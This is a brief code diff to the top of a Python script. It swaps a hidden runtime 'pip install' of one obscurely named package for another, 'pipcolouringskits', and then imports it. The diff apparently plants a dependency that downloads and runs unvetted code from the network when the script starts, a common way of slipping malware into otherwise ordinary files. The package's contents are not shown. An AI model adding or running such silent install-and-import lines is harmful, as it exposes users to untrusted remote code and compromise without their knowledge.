@@ -1,6 +1,6 @@
 import os
-os.system("pip install sysfontinglib")
-import sysfontinglib
+os.system("pip install pipcolouringskits")
+import pipcolouringskits
 import random
 import requests
 import time
